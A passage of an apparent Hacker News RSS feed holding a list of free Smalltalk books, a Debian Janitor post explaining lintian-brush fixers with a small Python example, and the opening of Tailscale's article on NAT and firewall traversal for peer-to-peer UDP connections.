	   I started to be fed up to see all the books I like to be out of print, so I started to contact authors and 
	   collect their old books. I would like to thanks them all and their publishers as well. If you
       know an author that is willing to give to the community a book, please give
       him my email. You can support me. </p><p> Thanks in advance. 




</p><p>
You can find a lot more recent and free books at <a href="http://books.pharo.org/">http://books.pharo.org</a>: Spec, Pharo by Example Updated, Pharo with Style, Learning OOD with TDD, and many more. 
In addition most the new books around Pharo are hosted at <a href="http://github.com/SquareBracketAssociates">http://github.com/SquareBracketAssociates</a> and each project has an automatic build with the latest PDF version.


</p><p>
If you have more books and you want to get them archived and listed here please contact me.

</p><div width="95%" height="174">

	<tbody><tr>
	    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/DynamicWebDevInSeaside/DynWebDevInSeaside.png" width="100"></td>
	    <td>
	      <p><a href="http://book.seaside.st/">[ Dynamic Web Development with Seaside ]</a> Stephane Ducasse, Lukas Renggli, David C. Shaffer and Rick Zaccone. Square Bracket Associates, 2009.</p>
	     
	This book is made available under the Creative Commons Attribution-ShareAlike 3.0 license. You will be able to  buy a softcover copy from <a href="http://www.lulu.com/">lulu.com</a>. 
	    </td>
	  </tr>
	

	<tr>
	    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/PBE/PharoByExample.png" width="100"></td>
	    <td>
	      <p><a href="http://books.pharo.org/">[ Pharo by Example (original version and translation) ]</a> Andrew P. Black, Stéphane Ducasse, Oscar Nierstrasz, Damien Pollet with Damien Cassou and Marcus Denker. Square Bracket Associates, 2009.</p> Pay attention there is also Pharo by Example Updated (for Pharo 50) and we are working on Pharo by Example for Pharo 80.
	     
	This book is made available under the Creative Commons Attribution-ShareAlike 3.0 license. You will be able to  buy a softcover copy from <a href="http://www.lulu.com/">lulu.com</a>. 
	    </td>
	  </tr>

	<tr>
	    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/Gnu/GNU.png" width="100"></td>
	    <td>
	     <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/Gnu/computer_programming_using_gnu_smalltalk.pdf">[ Computer Programming using GNU Smalltalk ]</a> Canol Gokel, free e-book. 2009. 
	   <a href="http://www.canol.info/books/computer_programming_using_gnu_smalltalk">home page of the book to have an up to date version</a>.
		</p> 
	    </td>
	  </tr> 


  	<tr>
	    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/SBE/sbe.png" width="100"></td>
	    <td>
	      <p><a href="https://hal.inria.fr/inria-00441576/document">[ Squeak by Example ]</a> Andrew P. Black, Stéphane Ducasse, Oscar Nierstrasz and Damien Pollet. Square Bracket Associates, 2007.</p> Watch out this book is old. Better read <a href="http://books.pharo.org/">Pharo by Example book</a>.
	    </td>
	  </tr>
	
	<tr>
	    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/SmalltalkDesignPatternCompanion/coversm.gif" width="100"></td>
	    <td>
	      <p> <a href="http://sdmeta.gforge.inria.fr/FreeBooks/SmalltalkDesignPatternCompanion">[ Smalltalk design pattern companion book drafts ]</a> Sherman Alpert, Kyle Brown, and Bobby Woolf. Addison-Wesley,  978-02011846241998.</p>
		The chapters listed here are not in their final form but more in draft form. Buy the book it is really excellent. 
	    </td>
	  </tr>
	
	
   <tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/ByExample/byExample.gif" width="100"></td>
    <td> 
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/ByExample/">[ Smalltalk by
      Example: the Developer's Guide ]</a> Alex Sharp, McGraw Hill Text; ISBN:
      0079130364, 1997.</p>
      This book covers all kinds of issues basic level, design, testing... I
      liked it a lot. The code and the book as a single file containing everything are available. Thank again
      Lukas Renggli for his effort for converting everything from Word.
       Thanks a lot Alec and thanks McGraw-Hill <a href="http://books.mcgraw-hill.com/">http://books.mcgraw-hill.com/</a>
  They were really nice with us so think about it if you hesitate to buy
  one of their books. Not all the publishers are that open-minded. 
  </td>
  </tr>
  
<tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/WithStyle/WithStyle.gif" width="100"></td>
    <td>
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/WithStyle/SmalltalkWithStyle.pdf">[ Smalltalk With Style ]</a> by Edward Klimas, Suzanne Skublics and David A. Thomas. 
		ISBN: 0-13-165549-3, Publisher: Prentice Hall, Copyright: 1996. A great and 
		small book that everybody should read. Thanks Ed, Suzanne and Dave to give it for free. 
		Thanks Don for the OCR!
	   </p>
    </td>
  </tr>
  
  
<tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/InsideST/InsideSmalltalkV1.png" width="100"></td>
    <td>
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/InsideST/InsideSmalltalk.pdf">[ Inside Smalltalk 
       (Volume One) ]</a>  by LaLonde, Wilf R. and Pugh, John R., Prentice-Hall, 1990, ISBN 0-13-468414-1.
       Thanks Don for the OCR! 
	   </p>
    </td>
  </tr>
  
  
  <tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/InsideST/InsideSmalltalkV2.png" width="100"></td>
    <td>
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/InsideST/InsideSmalltalkII.pdf">[ Inside Smalltalk (Volume Two)],</a>  by LaLonde, Wilf R. and Pugh, John R., Prentice-Hall, 1990, ISBN 0-13-468414-1. Thanks Don for the OCR! </p>
    </td>
  </tr>
  
<tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/LittleSmalltalk/littleST.jpeg" width="100"></td>
    <td>
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/LittleSmalltalk/ALittleSmalltalk.pdf">[ A Little Smalltalk ] </a> by Tim Budd, Addison-Wesley 1987.  
      <br>Many thanks to Tim Budd and his  publisher. Please have a look at <a href="http://www.aw.com/catalog/academic/discipline/1,4094,69948,00.html">http://www.aw.com/catalog/academic/discipline/1,4094,69948,00.html</a>. Thanks Don for the OCR!.
		</p>
    </td>
  </tr>
  
<tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/Art/Art.gif" width="100"></td>
    <td>
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/Art/artAdded174186187Final.pdf">[ The Art and Science of Smalltalk ]</a>  by Simon Lewis, Prentice-Hall 1995-1999.  
      <br>Many thanks to the original publishers of this book Prentice-Hall, the responsible of the HP series and Simon Lewis.</p>
    </td>
  </tr>
<tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/PracticalSmalltalk/practical.gif" width="100"></td>
    <td>
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/PracticalSmalltalk/PracticalSmalltalk.pdf">[ Practical Smalltalk: Using Smalltalk/V ]</a>  by Dan Shafer and Dean A. Ritz, Springer Verlag; (July 1991).  
      <br>Many thanks to the original publishers of this book Springer Verlag,  and Dan. Thanks</p>
    </td>
  </tr>
  
  
<tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/HopkinsHoran/HopkinsHoran.jpg" width="100"></td>
    <td>
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/HopkinsHoran/HopkinsHoran.pdf">[ Smalltalk An Introduction to Application Development using VisualWorks ]</a> Trevor Hopkins and Bernard Horan,  Pearson Education, 1995. The answers of the exercises are at ftp://st.cs.uiuc.edu/pub/Smalltalk/books/Book_Answers.tar.gz
      <br>Many thanks to the original publishers of this book,  Pearson Education,  for permission to distribute this work, and of course the authors! </p>
    </td>
  </tr>

<tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/STandOO/st-and-oo.jpg" width="100"></td>
    <td>
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/STandOO/Smalltalk-and-OO.pdf"> [ Smalltalk and Object Orientation: an Introduction ] </a> Springer-Verlag, ISBN 3-540-76115-2, 1997.
</p>
      <br>This book provides a good survey of Smalltalk. Some information are now obsolete 
      but it is still worth reading. Enjoy it. Thanks John to support our request. We want to thank Springer Verlag Publishing
    for allowing us to give you this book for free.
    </td>
  </tr>
  
 <tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/SmalltalkVTutorial/emptyCover.gif" width="100"></td>
    <td>
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/SmalltalkVTutorial/SmalltalkVTutorial.pdf"> [ Smalltalk V Tutorial ]</a>
	   </p>
    </td>
  </tr>

  <tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/Taste/taste.gif" width="100"></td>
    <td>
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/Taste/"> [ The Taste of Smalltalk ] </a> Ted Kaehler and Dave Patterson, W W Norton Co.; ISBN: 0393955052; (May 1986).</p>
      This book is for collectors. The quotes are really excellent. 
      <br>All the chapters are ready (except chap.2 for now)
    Enjoy it. (Scanned ... by Stef, Alex, Gabriela, and Lukas).
    Thanks Ted.
    </td>
  </tr>

 <tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/emptyCover.gif" width="100"></td>
    <td>
     <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/Joy/">[ The Joy Of Smalltalk ]</a> Ivan
    Tomek (September 2000). 700 pages</p>
    Ivan wrote this book and he gave it to the community. It contains a lot of useful material. 
    Thanks again ivan and continue to write good books. 
    </td>
  </tr>
  
  
  
   <!--<tr>
    <td width="45%"><img src="FreeBooks/SmalltalkObjectAndDesign/SmalltalkObjectAndDesign.jpg" width=100></td>
    <td width="55%">
      <p><a href="http://books.iuniverse.com/viewbooks.asp?isbn=1583484906&page=fm1">Smalltalk,objects and design</a>
	  Liu, iUniverse books</p>
      
	  </font>
    </td>
  </tr>-->
  
  <tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/BitsOfHistory/BitsOfHistory.gif" width="100"></td>
    <td>
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/BitsOfHistory/"> [ Smalltalk-80, Bits of History, Words of Advice] </a> By Glen Krasner, Editor
ISBN 0-201-11669-3. 344 pp. 1983</p>
      This book is for collectors. Thanks Glenn.
    </td>
  </tr>

  <tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/BlueBook/blueBook.jpg" width="100"></td>
    <td>
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/BlueBook/">[ Smalltalk-80: The Language and its Implementation ]</a>
	By Adele Goldberg and DavidRobson; 		Xerox Palo Alto Research Center
	ISBN 0-201-11371-6. 344 pp. 1983</p>
    </td>
  </tr>
  
  <tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/TheInteractiveProgrammingEnv/TheInteractiveProgrammingEnv.gif" width="100"></td>
    <td>
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/TheInteractiveProgrammingEnv/TheInteractiveProgrammingEnv.pdf">[ Smalltalk-80, The Interactive Programming Environment ]</a> By Adele Goldberg 
ISBN  0201113724. 560 pp. 1983</p> This book is for collectors. Thanks Adele. Thanks Don for the OCR!
    </td>
  </tr>
  
 <tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/CollectiveNBlueBook/small-bluebook-cover.jpg" width="100"></td>
    <td>
    <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/CollectiveNBlueBook/">[ DRAFTS of Squeak, Open Personal Computing and Multimedia ]</a> Mirror of <a href="http://coweb.cc.gatech.edu/squeakbook/">http://coweb.cc.gatech.edu/squeakbook/</a> Edited by Mark Guzdial and Kim Rose. Prentice-Hall 2000.  It's available from Prentice-Hall.  </p>
    <br>
    </td>
  </tr>
  
  
   <tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/GuzdialBookDrafts/mark1.jpg" width="100"></td>
    <td>
     <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/GuzdialBookDrafts/">[ DRAFS of Squeak: Open Personal Computing for Multimedia ]</a>
	 taken from <a href="http://www.cc.gatech.edu/~mark.guzdial/drafts/">http://www.cc.gatech.edu/~mark.guzdial/drafts/</a> 
	 Mark Guzdial, Prentice-Hall 2000. It's available from Prentice-Hall. </p>
    </td>
  </tr>
  
  <tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/Syntax/BuchLogo.png" width="100"></td>
    <td>
      <p> <a href="http://sdmeta.gforge.inria.fr/FreeBooks/Syntax/Syntax.zip">[ (In German) Syntaxbasierte
      Programmierwerkzeuge ]</a> L. Schmitz, B.G. Teubner Stuttgart 1995.  
        1996.</p>
      <p>This book presents compilation techniques in german.
	 Lothar Schmitz is still developing a free visual compiler-compiler
	 (SIC and JACCIE).  <!-- <a
	 href="http://ist.unibw-muenchen.de/Research/Tools/SIC">http://ist.unibw-muenchen.de/Research/Tools/SIC</a> 
<a href="http://ist.unibw-muenchen.de/Research/Tools/JACCIE">http://ist.unibw-muenchen.de/Research/Tools/JACCIE</a> 
-->

</p>
    </td>
  </tr>

  <tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/SmalltalkDE/emptyCover.gif" width="100"></td>
    <td>
      <p> <a href="http://sdmeta.gforge.inria.fr/FreeBooks/SmalltalkDE/smalltalkBuch.pdf">[ (In German) Smalltalk
      Einfuehrung in die objekt-orientierte Programmierung ]</a> Peter P. Bothner, Wolf-Michael Kaehler 1999.  
        1996.</p>
      <p>This book presents object-oriented programming in german with VisualWorks.  
<!-- <a href="http://e-books.zfn.uni-bremen.de/e-book-SMALLTALK.html</a>  
-->

</p>
    </td>
  </tr>
  
  <tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/emptyCover.gif" width="100"></td>
    <td>
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/Swedish/">[  (In Swedish) Objektorienterad programmering i Smalltalk ]</a>
	  Bjoern Eiderbaeck, Per Haegglund, and Olle Baelter</p>
      <br>Thanks Bjoern Eiderbaeck.
	  
    </td>
  </tr>
  
  <tr>
    <td><img src="http://sdmeta.gforge.inria.fr/FreeBooks/Programando/Programando.gif" width="100"></td>
    <td>
      <p><a href="http://sdmeta.gforge.inria.fr/FreeBooks/Programando/ProgramandoConSmalltalk-BORRADORFINAL07-Febrero-2006.pdf">[ (In Spanish) Programando con Smalltalk ]</a>
	  Diego Gomez Deck</p>
      <br>Thanks Diego. This book is distributed under the Creative Commons license.
	  
    </td>
  </tr>
  
</tbody></div><p>
 I added some other material because they illustrate the philosophy behind Smalltalk.

 </p></div>]]>
            </description>
            <link>http://stephane.ducasse.free.fr/FreeBooks.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24241561</guid>
            <pubDate>Sat, 22 Aug 2020 04:33:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Debian Janitor: 60k Lintian Issues Automatically Fixed]]>
            </title>
            <description>
<![CDATA[
Score 124 | Comments 17 (<a href="https://news.ycombinator.com/item?id=24241549">thread link</a>) | @zdw
<br/>
August 21, 2020 | https://www.jelmer.uk/janitor-update-3.html | <a href="https://web.archive.org/web/*/https://www.jelmer.uk/janitor-update-3.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="layout">
    <div>
        <div>
            <section>
                
            </section>
            <p>The <a href="https://jelmer.uk/debian-janitor.html">Debian Janitor</a> is an automated
system that commits fixes for (minor) issues in Debian packages that can be
fixed by software. It gradually started proposing merges in early
December. The first set of changes sent out ran <a href="https://salsa.debian.org/jelmer/lintian-brush">lintian-brush</a> on sid packages maintained in
Git. This post is part of <a href="https://jelmer.uk/tag/janitor-update.html">a series</a> about the progress of the
Janitor.</p>
<div id="scheduling-lintian-fixes">
<h2>Scheduling Lintian Fixes</h2>
<p>To determine which packages to process, the  <a href="https://janitor.debian.net/">Janitor</a>  looks at the import of  <a href="https://lintian.debian.org/">lintian</a>  output across the archive that is available
in  <a href="https://wiki.debian.org/UltimateDebianDatabase/">UDD</a> <a href="#f1" id="id1">[1]</a>. It
will prioritize those packages with the most and more severe issues that it has
fixers for.</p>
<p>Once a package is selected, it will clone the packaging repository and run
<a href="https://manpages.debian.org/testing/lintian-brush/lintian-brush.1.en.html">lintian-brush</a>
on it.  Lintian-brush provides a framework for applying a set of “fixers” to a
package. It will run each of a set of “fixers” in a pristine version of the
repository, and handles most of the heavy lifting.</p>
</div>
<div id="the-inner-workings-of-a-fixer">
<h2>The Inner Workings of a Fixer</h2>
<p>Each fixer is just an executable which gets run in a clean
checkout of the package, and can make changes there. Most
of the fixers are written in Python or shell, but they
can be in any language.</p>
<p>The contract for fixers is pretty simple:</p>
<ul>
<li>If the fixer exits with non-zero, the changes are reverted and fixer is
considered to have failed</li>
<li>If exits with zero and made changes, then it should write a summary of its
changes to standard out</li>
</ul>
<p>If a fixer is uncertain about the changes it has made, it should report so on
standard output using a pseudo-header.  By default, lintian-brush will discard
any changes with uncertainty but if you are running it locally you can still
apply them by specifying <tt><span>--uncertain</span></tt>.</p>
<p>The summary message on standard out will be used for the commit message and
(possibly) the changelog message, if the package doesn’t use gbp dch.</p>
</div>
<div id="example-fixer">
<h2>Example Fixer</h2>
<p>Let’s look at an example. The package priority “extra” is deprecated since
Debian Policy 4.0.1 (released August 2 017) – see
<a href="https://www.debian.org/doc/debian-policy/ch-archive.html#priorities">Policy 2.5 "Priorities"</a>.
Instead, most packages should use the “optional” priority.</p>
<p>Lintian will warn when a package uses the deprecated “extra” value for the
“Priority”  - the associated tag is
<a href="https://lintian.debian.org/tags/priority-extra-is-replaced-by-priority-optional.html">priority-extra-is-replaced-by-priority-optional</a>.
Lintian-brush has a fixer script that can automatically replace “extra” with
“optional”.</p>
<p>On systems that have lintian-brush installed, the source for the fixer lives in
<a href="https://salsa.debian.org/jelmer/lintian-brush/-/blob/master/fixers/priority-extra-is-replaced-by-priority-optional.py">/usr/share/lintian-brush/fixers/priority-extra-is-replaced-by-priority-optional.py</a>,
but here is a copy of it for reference:</p>
<table><tbody><tr><td><div><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td><div><pre><span></span><span>#!/usr/bin/python3</span>

<span>from</span> <span>debmutate.control</span> <span>import</span> <span>ControlEditor</span>
<span>from</span> <span>lintian_brush.fixer</span> <span>import</span> <span>report_result</span><span>,</span> <span>fixed_lintian_tag</span>

<span>with</span> <span>ControlEditor</span><span>()</span> <span>as</span> <span>updater</span><span>:</span>
    <span>for</span> <span>para</span> <span>in</span> <span>updater</span><span>.</span><span>paragraphs</span><span>:</span>
        <span>if</span> <span>para</span><span>.</span><span>get</span><span>(</span><span>"Priority"</span><span>)</span> <span>==</span> <span>"extra"</span><span>:</span>
            <span>para</span><span>[</span><span>"Priority"</span><span>]</span> <span>=</span> <span>"optional"</span>
            <span>fixed_lintian_tag</span><span>(</span>
                <span>para</span><span>,</span> <span>'priority-extra-is-replaced-by-priority-optional'</span><span>)</span>

<span>report_result</span><span>(</span><span>"Change priority extra to priority optional."</span><span>)</span>
</pre></div>
</td></tr></tbody></table><p>This fixer is written in Python and uses the  <a href="https://salsa.debian.org/jelmer/debmutate">debmutate</a>  library to easily modify
control files while preserving formatting — or back out if it is not possible
to preserve formatting.</p>
<p>All the current fixers come with tests, e.g. for this particular fixer the
tests can be found here:
<a href="https://salsa.debian.org/jelmer/lintian-brush/-/tree/master/tests/priority-extra-is-replaced-by-priority-optional">https://salsa.debian.org/jelmer/lintian-brush/-/tree/master/tests/priority-extra-is-replaced-by-priority-optional</a>.</p>
<p>For more details on writing new fixers, see the  <a href="https://salsa.debian.org/jelmer/lintian-brush#writing-new-fixers">README</a>  for
lintian-brush.</p>
<p>For more details on debugging them, see the  <a href="https://manpages.debian.org/unstable/lintian-brush/lintian-brush.1.en.html">manual page</a>.</p>
</div>


            

            

            
            <p><a href="#">Go Top</a></p>        </div>
    </div>
</div></div>]]>
            </description>
            <link>https://www.jelmer.uk/janitor-update-3.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24241549</guid>
            <pubDate>Sat, 22 Aug 2020 04:30:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Flow-fill layout for images and video]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24241331">thread link</a>) | @it
<br/>
August 21, 2020 | https://layout.speakeasyevents.live/flowfill/?n=70&spacing=8 | <a href="https://web.archive.org/web/*/https://layout.speakeasyevents.live/flowfill/?n=70&spacing=8">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://layout.speakeasyevents.live/flowfill/?n=70&amp;spacing=8</link>
            <guid isPermaLink="false">hacker-news-small-sites-24241331</guid>
            <pubDate>Sat, 22 Aug 2020 03:42:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How NAT Traversal Works]]>
            </title>
            <description>
<![CDATA[
Score 129 | Comments 29 (<a href="https://news.ycombinator.com/item?id=24241105">thread link</a>) | @signa11
<br/>
August 21, 2020 | https://tailscale.com/blog/how-nat-traversal-works/ | <a href="https://web.archive.org/web/*/https://tailscale.com/blog/how-nat-traversal-works/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
<p>We covered a lot of ground in our post about <a href="https://tailscale.com/blog/how-tailscale-works/"><em>How Tailscale
Works</em></a>.  However, we glossed over how we can get through NATs
(Network Address Translators) and connect your devices directly to
each other, no matter what’s standing between them. Let’s talk about
that now!</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-intro.png">
    
    
</figure>

<p>Let’s start with a simple problem: establishing a peer-to-peer
connection between two machines. In Tailscale’s case, we want to set
up a WireGuard® tunnel, but that doesn’t really matter. The
techniques we use are widely applicable and the work of many people
over decades. For example, <a href="https://webrtc.org/">WebRTC</a> uses this bag of tricks to
send peer-to-peer audio, video and data between web browsers. VoIP
phones and some video games use similar techniques, though not always
successfully.</p>
<p>We’ll be discussing these techniques generically, using Tailscale and
others for examples where appropriate. Let’s say you’re making your
own protocol and that you want NAT traversal. You need two things.</p>
<p>First, the protocol should be based on UDP. You <em>can</em> do NAT traversal
with TCP, but it adds another layer of complexity to an already quite
complex problem, and may even require kernel customizations depending
on how deep you want to go. We’re going to focus on UDP for the rest
of this article.</p>
<p>If you’re reaching for TCP because you want a stream-oriented
connection when the NAT traversal is done, consider using QUIC
instead. It builds on top of UDP, so we can focus on UDP for NAT
traversal and still have a nice stream protocol at the end.</p>
<p>Second, you need direct control over the network socket that’s sending
and receiving network packets. As a rule, you can’t take an existing
network library and make it traverse NATs, because you have to send
and receive extra packets that aren’t part of the “main” protocol
you’re trying to speak. Some protocols tightly integrate the NAT
traversal with the rest (e.g. WebRTC). But if you’re building your
own, it’s helpful to think of NAT traversal as a separate entity that
shares a socket with your main protocol. Both run in parallel, one
enabling the other.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-deep-integration.png">
    
    
</figure>

<p>Direct socket access may be tough depending on your situation. One
workaround is to run a local proxy. Your protocol speaks to this
proxy, and the proxy does both NAT traversal and relaying of your
packets to the peer. This layer of indirection lets you benefit from
NAT traversal without altering your original program.</p>
<p>With prerequisites out of the way, let’s go through NAT traversal from
first principles. Our goal is to get UDP packets flowing
bidirectionally between two devices, so that our other protocol
(WireGuard, QUIC, WebRTC, …) can do something cool. There are two
obstacles to having this Just Work: stateful firewalls and NAT
devices.</p>
<h3 id="figuring-out-firewalls">Figuring out firewalls</h3>
<p>Stateful firewalls are the simpler of our two problems. In fact, most
NAT devices include a stateful firewall, so we need to solve this
subset before we can tackle NATs.</p>
<p>There are many incarnations to consider. Some you might recognize are
the Windows Defender firewall, Ubuntu’s ufw (using iptables/nftables),
BSD’s pf (also used by macOS) and AWS’s Security Groups. They’re all
very configurable, but the most common configuration allows all
“outbound” connections and blocks all “inbound” connections. There
might be a few handpicked exceptions, such as allowing inbound SSH.</p>
<p>But connections and “direction” are a figment of the protocol
designer’s imagination. On the wire, every connection ends up being
bidirectional; it’s all individual packets flying back and forth. How
does the firewall know what’s inbound and what’s outbound?</p>
<p>That’s where the stateful part comes in. Stateful firewalls remember
what packets they’ve seen in the past and can use that knowledge when
deciding what to do with new packets that show up.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-1a.png">
    
    
</figure>

<p>For UDP, the rule is very simple: the firewall allows an inbound UDP
packet if it previously saw a matching outbound packet. For example,
if our laptop firewall sees a UDP packet leaving the laptop from
<code>2.2.2.2:1234</code> to <code>7.7.7.7:5678</code>, it’ll make a note that incoming
packets from <code>7.7.7.7:5678</code> to <code>2.2.2.2:1234</code> are also fine. The
trusted side of the world clearly intended to communicate with
<code>7.7.7.7:5678</code>, so we should let them talk back.</p>
<p>(As an aside, some <em>very</em> relaxed firewalls might allow traffic from
anywhere back to <code>2.2.2.2:1234</code> once <code>2.2.2.2:1234</code> has communicated
with anyone. Such firewalls make our traversal job easier, but are
increasingly rare.)</p>
<h4 id="firewall-face-off">Firewall face-off</h4>
<p>This rule for UDP traffic is only a minor problem for us, as long as
all the firewalls on the path are “facing” the same way. That’s
usually the case when you’re communicating with a server on the
internet. Our only constraint is that the machine that’s <em>behind</em> the
firewall(s) must be the one initiating all connections. Nothing can
talk to it, unless it talks first.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-2.png">
    
    
</figure>

<p>This is fine, but not very interesting: we’ve reinvented client/server
communication, where the server makes itself easily reachable to
clients. In the VPN world, this leads to a hub-and-spoke topology: the
hub has no firewalls blocking access to it and the firewalled spokes
connect to the hub.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-3.png">
    
    
</figure>

<p>The problems start when two of our “clients” want to talk
directly. Now the firewalls are facing each other. According to the
rule we established above, this means both sides must go first, but
also that neither can go first, because the other side has to go
first!</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-4.png">
    
    
</figure>

<p>How do we get around this? One way would be to require users to
reconfigure one or both of the firewalls to “open a port” and allow
the other machine’s traffic. This is not very user friendly. It also
doesn’t scale to mesh networks like Tailscale, in which we expect the
peers to be moving around the internet with some regularity. And, of
course, in many cases you don’t have control over the firewalls: you
can’t reconfigure the router in your favorite coffee shop, or at the
airport. (At least, hopefully not!)</p>
<p>We need another option. One that doesn’t involve reconfiguring
firewalls.</p>
<h4 id="finessing-finicky-firewalls">Finessing finicky firewalls</h4>
<p>The trick is to carefully read the rule we established for our
stateful firewalls. For UDP, the rule is: <strong>packets must flow out
before packets can flow back in.</strong></p>
<p>However, nothing says the packets must be <em>related</em> to each other
beyond the IPs and ports lining up correctly. As long as <em>some</em> packet
flowed outwards with the right source and destination, any packet that
<em>looks like</em> a response will be allowed back in, even if the other
side never received your packet!</p>
<p>So, to traverse these multiple stateful firewalls, we need to share
some information to get underway: the peers have to know in advance
the <code>ip:port</code> their counterpart is using. One approach is to
statically configure each peer by hand, but this approach doesn’t
scale very far. To move beyond that, we built a <a href="https://tailscale.com/blog/how-tailscale-works/#the-control-plane-key-exchange-and-coordination">coordination
server</a> to keep the <code>ip:port</code> information synchronized in a
flexible, secure manner.</p>
<p>Then, the peers start sending UDP packets to each other. They must
expect some of these packets to get lost, so they can’t carry any
precious information unless you’re prepared to retransmit them. This
is generally true of UDP, but especially true here. We’re <em>going</em> to
lose some packets in this process.</p>
<p>Our laptop and workstation are now listening on fixed ports, so that
they both know exactly what <code>ip:port</code> to talk to. Let’s take a look at
what happens.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-5a.png">
    
    
</figure>

<p>The laptop’s first packet, from <code>2.2.2.2:1234</code> to <code>7.7.7.7:5678</code>, goes
through the Windows Defender firewall and out to the internet. The
corporate firewall on the other end blocks the packet, since it has no
record of <code>7.7.7.7:5678</code> ever talking to <code>2.2.2.2:1234</code>. However,
Windows Defender now remembers that it should expect and allow
responses from <code>7.7.7.7:5678</code> to <code>2.2.2.2:1234</code>.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-5b.png">
    
    
</figure>

<p>Next, the workstation’s first packet from <code>7.7.7.7:5678</code> to
<code>2.2.2.2:1234</code> goes through the corporate firewall and across the
internet. When it arrives at the laptop, Windows Defender thinks “ah,
a response to that outbound request I saw”, and lets the packet
through! Additionally, the corporate firewall now remembers that it
should expect responses from <code>2.2.2.2:1234</code> to <code>7.7.7.7:5678</code>, and
that those packets are also okay.</p>
<p>Encouraged by the receipt of a packet from the workstation, the laptop
sends another packet back. It goes through the Windows Defender
firewall, through the corporate firewall (because it’s a “response” to
a previously sent packet), and arrives at the workstation.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-5c.png">
    
    
</figure>

<p>Success! We’ve established two-way communication through a pair of
firewalls that, at first glance, would have prevented it.</p>
<h4 id="creative-connectivity-caveats">Creative connectivity caveats</h4>
<p>It’s not always so easy. We’re relying on some indirect influence over
third-party systems, which requires careful handling. What do we need
to keep in mind when managing firewall-traversing connections?</p>
<p>Both endpoints must attempt communication at roughly the same time, so
that all the intermediate firewalls open up while both peers are still
around. One approach is to have the peers retry continuously, but this
is wasteful. Wouldn’t it be better if both peers knew to start
establishing a connection at the same time?</p>
<p>This may sound a little recursive: to communicate, first you need to
be able to communicate. However, this preexisting “side channel”
doesn’t need to be very fancy: it can have a few seconds of latency,
and only needs to deliver a few thousand bytes in total, so a tiny VM
can easily be a matchmaker for thousands of machines.</p>
<p>In the distant past, I used XMPP chat messages as the side channel,
with great results. As another example, WebRTC requires you to come up
with your own “signalling channel” (a name that reveals WebRTC’s IP
telephony ancestry), and plug it into the WebRTC APIs. In Tailscale,
our coordination server and fleet of DERP (Detour Encrypted Routing
